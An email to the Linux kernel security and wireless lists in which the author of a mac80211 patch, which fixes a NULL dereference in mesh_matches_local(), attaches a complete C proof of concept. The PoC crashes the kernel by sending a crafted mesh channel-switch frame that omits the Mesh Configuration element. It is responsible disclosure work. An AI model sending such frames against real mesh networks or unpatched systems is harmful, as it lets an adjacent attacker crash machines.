Return-Path: <linux-wireless+bounces-33371-lists+linux-wireless=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-wireless@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id CBBiMPQsumkqSgIAu9opvQ
	(envelope-from <linux-wireless+bounces-33371-lists+linux-wireless=lfdr.de@vger.kernel.org>)
	for <lists+linux-wireless@lfdr.de>; Wed, 18 Mar 2026 05:41:24 +0100
X-Original-To: lists+linux-wireless@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 0C3452B5C9A
	for <lists+linux-wireless@lfdr.de>; Wed, 18 Mar 2026 05:41:24 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id B94433022FB2
	for <lists+linux-wireless@lfdr.de>; Wed, 18 Mar 2026 04:41:22 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 5614A354ACE;
	Wed, 18 Mar 2026 04:41:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="OPgdcBzI"
X-Original-To: linux-wireless@vger.kernel.org
Received: from mail-dl1-f50.google.com (mail-dl1-f50.google.com [74.125.82.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 87DA032FA18
	for <linux-wireless@vger.kernel.org>; Wed, 18 Mar 2026 04:41:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.50
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1773808882; cv=none; b=i0I2/aVyMGlSZIzYrK5XuoHr+PasBLog5il6VfjMa1eS/Q1uzP5K3yV9IV88cbYQC9IGzUHFzHSEEW8U/I1l+FQMzK6V0gDTd7NQ23XXDJMkWXap43fSWQza4IO7E5BonbQewHVnOCU8H4PTlv2XW/t65sHQQqiIixhOTi0TpME=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1773808882; c=relaxed/simple;
	bh=/J+ASTkl9WElFOBVSaa8QCo751ufHjYWroOGCUkO/XY=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=I1qCSBrVKkQbpXJkGdKqF0KZ92Bkaxwoqjgy/9Diy5KB/RnoAJ47cEAXXEzTJk8mflaPdycClPqBEbnlvIq243R+B2ZNVHKXwt7yPOQ1SBV+Va9JQwVUfVg+IIgUaVaXcs6LYarik+CdZu9hSorYGbxAmbWklOiCK9q4itYv+Jg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=OPgdcBzI; arc=none smtp.client-ip=74.125.82.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-dl1-f50.google.com with SMTP id a92af1059eb24-126ea4e9694so1009096c88.1
        for <linux-wireless@vger.kernel.org>; Tue, 17 Mar 2026 21:41:20 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1773808880; x=1774413680; darn=vger.kernel.org;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:from:to
         :cc:subject:date:message-id:reply-to;
        bh=tRYg9JSUgvXK9NM5gGmEYeA3N/ZjezbLhEkELXos234=;
        b=OPgdcBzILj1HsFGIjlzMFXf5vg6iyX4ZEBstjFnd5M1cZ+PlPZ8lrMKkgLq+2/9W6a
         c4lSWDVGrE9ekdD9re4/7fInemUSGCUweYf8J5JUCi8DR+Bc02XM3mEG77sBtvLjmHBD
         i0pR8BEirMZ3Dgfs4VMeKBV1EwPVxFAe7xK+g0z7Lz2SBg6Jv2/zpoyeBG0XoyBfMHdA
         znNDg4lStbtM5p1iH7LhrxI727R3B4XHluwQGP5UOW2AVgoxkm2UtBR7NTRDi3iKb9WL
         v92Hd333nNeFcVgSEkrXg37rCY6GVkvdIazQeDKtoh73w8eI349Wa4yU1OLsxeeIIOu3
         BYqw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1773808880; x=1774413680;
        h=in-reply-to:content-transfer-encoding:content-disposition
         :mime-version:references:message-id:subject:cc:to:from:date:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=tRYg9JSUgvXK9NM5gGmEYeA3N/ZjezbLhEkELXos234=;
        b=Ks2lx6RNLpC7eEG9Q+lZZ3ZWsdEXrEp7JEldm0uwfCEYoIkWJCnF7ea2+suiyjs5Zb
         VABsBej8CIHahF8x7vQs4niOo6zvQpxnvdsmLsApwS8a94iQ9CyrVBMoQ3xBsKVHh2Ky
         xn//FqkiuJtGVQ1SmCc1sEU7snzwc96ziJlEDdMvTBNaPGI8nHZRCspNeTzFhwO2ZI/9
         f65TmnNbq4FauhsMI/yEfSooo69HY+hbHnPNZOcIpwx3vtxv32EsZJ83k9RLUcYpnqkj
         w6qvw3bKpSVtmRW1EqfhxPGbAMQWYt6ZpXVu0A4Nk+KiB/dQfAmHvIyYoym46eI6gVng
         LbDQ==
X-Forwarded-Encrypted: i=1; AJvYcCV+0H4uOsolocPL4dLVk6JlDQhRupjptsHznR8sf1+eHI2nX1gTXSTVYuy3IC96q/ObVAUYfb8eWY53mEIIEQ==@vger.kernel.org
X-Gm-Message-State: AOJu0YxIlC/ehWpPSXLo/bXKA85u9Rql6e5rIeJ+64eQq5WSE62WdRe1
	B4FXP8gTP8kiCQJK51EXUMfOpmtybwMAO1qkvz5KtCDUYH5uBUqSfEl78RbYSVxpUb6wvCQfuHi
	owVU=
X-Gm-Gg: ATEYQzytFbQx2HNZyLc1moIJx8XmwlKd4VolBmNtDFLy8Vi9yDi6hMWUVtP3UHukihr
	bX45sLsCQofde8t9Yw8XKdESMQlX9BVL5PbkOGNuX0e6ZPezJaqIBw6tBrgTaE4GT4rOSLbeYuq
	ix2tUGne72AiRVmGNoaXonNQEDPczRgY09gbCllyIpssF8nHVw4p8ALY9/cDdgo0rtYLuCQDTvx
	0v/tUZJ0ccUD/W/J4vY5npW6LPJHBEwXMTCe+nfdEXZPRdZzSpXNlTPKz3Jn8GFdyNIE8DbbiuX
	LjPWE3+LsmCdCvd604/L5+IjmtT5AlQD3F8EdBwOCaCgWMRXQqV4Zp4Uhngf2QJZ80SZ0DKxY7z
	uyxxZT8Nj1gEltrBdmUwRHan3huQWXTngvunBkhoSvZXbjsf72ipMHmbMcvcThDcGo0UeyCr8gM
	LUvuB3wve7JjjuAW+RDIVkIyLkE3UX9w==
X-Received: by 2002:a05:7022:b8e:b0:128:d0b1:527 with SMTP id a92af1059eb24-129a7199f1bmr1170592c88.36.1773808879455;
        Tue, 17 Mar 2026 21:41:19 -0700 (PDT)
Received: from p1 (209-147-138-15.nat.asu.edu. [209.147.138.15])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-129b4127b7esm3213646c88.9.2026.03.17.21.41.18
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 17 Mar 2026 21:41:19 -0700 (PDT)
Date: Tue, 17 Mar 2026 21:41:17 -0700
From: Xiang Mei <xmei5@asu.edu>
To: security@kernel.org
Cc: netdev@vger.kernel.org, johannes@sipsolutions.net, 
	linux-wireless@vger.kernel.org, bestswngs@gmail.com
Subject: Re: [PATCH net] wifi: mac80211: fix NULL deref in
 mesh_matches_local()
Message-ID: <k6lgszcsjftoc46jrpt6vtwmzxuzzfawrnujwilmxibqcmqb7a@4r4darslq6zo>
References: <20260318034244.2595020-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20260318034244.2595020-1-xmei5@asu.edu>
X-Spamd-Result: default: False [-1.66 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	MID_RHS_NOT_FQDN(0.50)[];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[vger.kernel.org,sipsolutions.net,gmail.com];
	TAGGED_FROM(0.00)[bounces-33371-lists,linux-wireless=lfdr.de];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	RCPT_COUNT_FIVE(0.00)[5];
	RCVD_COUNT_FIVE(0.00)[5];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,linux-wireless@vger.kernel.org];
	MISSING_XM_UA(0.00)[];
	TO_DN_NONE(0.00)[];
	TAGGED_RCPT(0.00)[linux-wireless];
	NEURAL_HAM(-0.00)[-1.000];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,asu.edu:dkim,asu.edu:email]
X-Rspamd-Queue-Id: 0C3452B5C9A
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Tue, Mar 17, 2026 at 08:42:44PM -0700, Xiang Mei wrote:
> mesh_matches_local() unconditionally dereferences ie->mesh_config to
> compare mesh configuration parameters. When called from
> mesh_rx_csa_frame(), the parsed action-frame elements may not contain a
> Mesh Configuration IE, leaving ie->mesh_config NULL and triggering a
> kernel NULL pointer dereference.
> 
> The other two callers are already safe:
>   - ieee80211_mesh_rx_bcn_presp() checks !elems->mesh_config before
>     calling mesh_matches_local()
>   - mesh_plink_get_event() is only reached through
>     mesh_process_plink_frame(), which checks !elems->mesh_config, too
> 
> mesh_rx_csa_frame() is the only caller that passes raw parsed elements
> to mesh_matches_local() without guarding mesh_config. An adjacent
> attacker can exploit this by sending a crafted CSA action frame that
> includes a valid Mesh ID IE but omits the Mesh Configuration IE,
> crashing the kernel.
> 
> The captured crash log:
> 
> Oops: general protection fault, probably for non-canonical address ...
> KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
> Workqueue: events_unbound cfg80211_wiphy_work
> [...]
> Call Trace:
>  <TASK>
>  ? __pfx_mesh_matches_local (net/mac80211/mesh.c:65)
>  ieee80211_mesh_rx_queued_mgmt (net/mac80211/mesh.c:1686)
>  [...]
>  ieee80211_iface_work (net/mac80211/iface.c:1754 net/mac80211/iface.c:1802)
>  [...]
>  cfg80211_wiphy_work (net/wireless/core.c:426)
>  process_one_work (net/kernel/workqueue.c:3280)
>  ? assign_work (net/kernel/workqueue.c:1219)
>  worker_thread (net/kernel/workqueue.c:3352)
>  ? __pfx_worker_thread (net/kernel/workqueue.c:3385)
>  kthread (net/kernel/kthread.c:436)
>  [...]
>  ret_from_fork_asm (net/arch/x86/entry/entry_64.S:255)
>  </TASK>
> 
> This patch adds a NULL check for ie->mesh_config at the top of
> mesh_matches_local() to return false early when the Mesh Configuration
> IE is absent.
> 
> Fixes: 2e3c8736820b ("mac80211: support functions for mesh")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/mac80211/mesh.c | 3 +++
>  1 file changed, 3 insertions(+)
> 
> diff --git a/net/mac80211/mesh.c b/net/mac80211/mesh.c
> index 28624e57aa499..8fdbdf9ba2a9e 100644
> --- a/net/mac80211/mesh.c
> +++ b/net/mac80211/mesh.c
> @@ -79,6 +79,9 @@ bool mesh_matches_local(struct ieee80211_sub_if_data *sdata,
>  	 *   - MDA enabled
>  	 * - Power management control on fc
>  	 */
> +	if (!ie->mesh_config)
> +		return false;
> +
>  	if (!(ifmsh->mesh_id_len == ie->mesh_id_len &&
>  	     memcmp(ifmsh->mesh_id, ie->mesh_id, ie->mesh_id_len) == 0 &&
>  	     (ifmsh->mesh_pp_id == ie->mesh_config->meshconf_psel) &&
> -- 
> 2.43.0
>

Thanks for your attention for this bug. 

The following information could help you to reproduce the bug:

Configs:

```
CONFIG_WIRELESS=y
CONFIG_CFG80211=y
CONFIG_MAC80211=y
CONFIG_MAC80211_MESH=y
CONFIG_MAC80211_HWSIM=y
CONFIG_RFKILL=y
```

To reproduce the crash, I attached the poc to this email:

```c
#define _GNU_SOURCE
#include <endian.h>
#include <errno.h>
#include <linux/genetlink.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUF_SIZE 4096
#define MESH_ID "meshpoc"
#define MESH_FREQ 2412
#define WLAN_EID_CHANNEL_SWITCH 37
#define WLAN_EID_MESH_ID 114

struct nl_req {
        struct nlmsghdr nlh;
        struct genlmsghdr genl;
        char buf[BUF_SIZE];
};

static uint16_t seq;

static void die(const char *s) { perror(s); exit(1); }

static void nla_put(struct nlmsghdr *n, uint16_t type, const void *d, size_t l)
{
        struct nlattr *a = (void *)n + NLMSG_ALIGN(n->nlmsg_len);
        a->nla_type = type;
        a->nla_len = NLA_HDRLEN + l;
        if (d && l) memcpy((void *)a + NLA_HDRLEN, d, l);
        n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(a->nla_len);
}

static void nla_put_u32(struct nlmsghdr *n, uint16_t t, uint32_t v)
{ nla_put(n, t, &v, 4); }

static void nla_put_flag(struct nlmsghdr *n, uint16_t t)
{ nla_put(n, t, NULL, 0); }

static int genl_send(int fd, struct nlmsghdr *nlh)
{
        struct sockaddr_nl a = { .nl_family = AF_NETLINK };
        char resp[BUF_SIZE];

        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = ++seq;
        nlh->nlmsg_pid = getpid();

        if (sendto(fd, nlh, nlh->nlmsg_len, 0, (void *)&a, sizeof(a)) < 0)
                return -errno;
        ssize_t n = recv(fd, resp, sizeof(resp), 0);
        if (n < 0) return -errno;
        struct nlmsghdr *h = (void *)resp;
        if (h->nlmsg_type == NLMSG_ERROR)
                return ((struct nlmsgerr *)NLMSG_DATA(h))->error;
        return 0;
}

static int genl_resolve(int fd, const char *name)
{
        struct nl_req req = {};
        struct nlmsghdr *nlh = &req.nlh;
        struct genlmsghdr *genl = NLMSG_DATA(nlh);
        struct sockaddr_nl a = { .nl_family = AF_NETLINK };
        char resp[BUF_SIZE];

        nlh->nlmsg_type = GENL_ID_CTRL;
        nlh->nlmsg_flags = NLM_F_REQUEST;
        nlh->nlmsg_seq = ++seq;
        nlh->nlmsg_pid = getpid();
        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*genl));
        genl->cmd = CTRL_CMD_GETFAMILY;
        genl->version = 1;
        nla_put(nlh, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);

        if (sendto(fd, nlh, nlh->nlmsg_len, 0, (void *)&a, sizeof(a)) < 0)
                return -errno;

        ssize_t n = recv(fd, resp, sizeof(resp), 0);
        if (n < 0) return -errno;
        struct nlmsghdr *h = (void *)resp;
        if (h->nlmsg_type == NLMSG_ERROR)
                return ((struct nlmsgerr *)NLMSG_DATA(h))->error;

        struct genlmsghdr *gh = NLMSG_DATA(h);
        int rem = h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
        struct nlattr *at;
        for (at = (void *)gh + GENL_HDRLEN; rem >= (int)sizeof(*at);
             rem -= NLA_ALIGN(at->nla_len), at = (void *)at + NLA_ALIGN(at->nla_len))
                if (at->nla_type == CTRL_ATTR_FAMILY_ID)
                        return *(uint16_t *)((void *)at + NLA_HDRLEN);
        return -ENOENT;
}

static void get_mac(const char *ifname, uint8_t mac[6])
{
        struct ifreq ifr = {};
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) die("socket");
        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
        if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) die("SIOCGIFHWADDR");
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
        close(fd);
}

static void if_down(const char *ifname)
{
        struct ifreq ifr = {};
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) return;
        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
        ioctl(fd, SIOCGIFFLAGS, &ifr);
        ifr.ifr_flags &= ~IFF_UP;
        ioctl(fd, SIOCSIFFLAGS, &ifr);
        close(fd);
}

static void if_up(const char *ifname)
{
        struct ifreq ifr = {};
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) die("socket");
        snprintf(ifr.ifr_name, IFNAMSIZ, "%s", ifname);
        ioctl(fd, SIOCGIFFLAGS, &ifr);
        ifr.ifr_flags |= IFF_UP;
        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) die("SIOCSIFFLAGS");
        close(fd);
}

/* Set interface type to MESH_POINT */
static int set_mesh_type(int fd, int nl80211, int ifindex)
{
        struct nl_req req = {};
        req.nlh.nlmsg_type = nl80211;
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
        req.genl.cmd = NL80211_CMD_SET_INTERFACE;
        nla_put_u32(&req.nlh, NL80211_ATTR_IFINDEX, ifindex);
        nla_put_u32(&req.nlh, NL80211_ATTR_IFTYPE, NL80211_IFTYPE_MESH_POINT);
        return genl_send(fd, &req.nlh);
}

/* Join a mesh network */
static int join_mesh(int fd, int nl80211, int ifindex)
{
        struct nl_req req = {};
        req.nlh.nlmsg_type = nl80211;
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
        req.genl.cmd = NL80211_CMD_JOIN_MESH;
        nla_put_u32(&req.nlh, NL80211_ATTR_IFINDEX, ifindex);
        nla_put(&req.nlh, NL80211_ATTR_MESH_ID, MESH_ID, strlen(MESH_ID));
        nla_put_u32(&req.nlh, NL80211_ATTR_WIPHY_FREQ, MESH_FREQ);
        return genl_send(fd, &req.nlh);
}

/*
 * Build the malformed CSA action frame:
 *   - Includes Mesh ID IE (passes the mesh_id_len + memcmp check)
 *   - Omits Mesh Configuration IE (elems->mesh_config stays NULL)
 *   -> mesh_matches_local() dereferences NULL -> kernel crash
 */
static size_t build_bad_frame(uint8_t *buf, const uint8_t da[6],
                              const uint8_t sa[6])
{
        uint8_t *p = buf;
        size_t idlen = strlen(MESH_ID);
        memset(buf, 0, 256);

        /* 802.11 mgmt header — action frame */
        *(uint16_t *)p = htole16(0x00d0); p += 2;
        p += 2;
        memcpy(p, da, 6); p += 6;
        memcpy(p, sa, 6); p += 6;
        memcpy(p, sa, 6); p += 6;
        p += 2;

        /* Spectrum management: channel switch */
        *p++ = 0; *p++ = 4;

        /* Channel Switch IE */
        *p++ = WLAN_EID_CHANNEL_SWITCH; *p++ = 3;
        *p++ = 0; *p++ = 1; *p++ = 1;

        /* Mesh ID IE — matches victim */
        *p++ = WLAN_EID_MESH_ID; *p++ = idlen;
        memcpy(p, MESH_ID, idlen); p += idlen;

        /* Mesh Config IE intentionally OMITTED */
        return p - buf;
}

/* Send raw frame via NL80211_CMD_FRAME */
static int tx_frame(int fd, int nl80211, int ifindex, void *frame, size_t len)
{
        struct nl_req req = {};
        req.nlh.nlmsg_type = nl80211;
        req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));
        req.genl.cmd = NL80211_CMD_FRAME;
        nla_put_u32(&req.nlh, NL80211_ATTR_IFINDEX, ifindex);
        nla_put_u32(&req.nlh, NL80211_ATTR_WIPHY_FREQ, MESH_FREQ);
        nla_put(&req.nlh, NL80211_ATTR_FRAME, frame, len);
        nla_put_flag(&req.nlh, NL80211_ATTR_DONT_WAIT_FOR_ACK);
        return genl_send(fd, &req.nlh);
}

int main(void)
{
        uint8_t da[6], sa[6], frame[256];
        int fd, nl80211, ret, idx0, idx1;

        printf("[*] mesh_matches_local() NULL deref PoC\n");

        fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
        if (fd < 0) die("socket");
        struct sockaddr_nl local = { .nl_family = AF_NETLINK, .nl_pid = getpid() };
        if (bind(fd, (void *)&local, sizeof(local)) < 0) die("bind");

        nl80211 = genl_resolve(fd, "nl80211");
        if (nl80211 < 0) { fprintf(stderr, "nl80211 not found\n"); return 1; }

        idx0 = if_nametoindex("wlan0");
        idx1 = if_nametoindex("wlan1");
        if (!idx0 || !idx1) {
                fprintf(stderr, "wlan0/wlan1 not found. Need mac80211_hwsim radios=2\n");
                return 1;
        }

        /* Step 1: Set both interfaces to mesh mode */
        printf("[*] configuring mesh interfaces\n");
        if_down("wlan0");
        if_down("wlan1");
        usleep(200000);

        ret = set_mesh_type(fd, nl80211, idx0);
        if (ret) { fprintf(stderr, "set wlan0 mesh: %d\n", ret); return 1; }
        ret = set_mesh_type(fd, nl80211, idx1);
        if (ret) { fprintf(stderr, "set wlan1 mesh: %d\n", ret); return 1; }

        if_up("wlan0");
        if_up("wlan1");

        /* Step 2: Join mesh */
        ret = join_mesh(fd, nl80211, idx0);
        if (ret) { fprintf(stderr, "join wlan0: %d\n", ret); return 1; }
        ret = join_mesh(fd, nl80211, idx1);
        if (ret) { fprintf(stderr, "join wlan1: %d\n", ret); return 1; }

        printf("[*] mesh joined on %d MHz\n", MESH_FREQ);
        sleep(1);

        /* Step 3: Send malformed frame */
        get_mac("wlan0", da);
        get_mac("wlan1", sa);
        printf("[*] victim  %02x:%02x:%02x:%02x:%02x:%02x\n",
               da[0], da[1], da[2], da[3], da[4], da[5]);
        printf("[*] attacker %02x:%02x:%02x:%02x:%02x:%02x\n",
               sa[0], sa[1], sa[2], sa[3], sa[4], sa[5]);

        size_t flen = build_bad_frame(frame, da, sa);
        printf("[*] sending malformed CSA frame (%zu bytes)\n", flen);

        ret = tx_frame(fd, nl80211, idx1, frame, flen);
        if (ret) { fprintf(stderr, "tx failed: %d\n", ret); return 1; }

        printf("[*] sent — check dmesg for null-ptr-deref in mesh_matches_local\n");
        sleep(3);
        return 0;
}
```

The intended crash was attached in the commit message. Please let me know
if you have any questions for the patch and poc.

Thanks,
Xiang


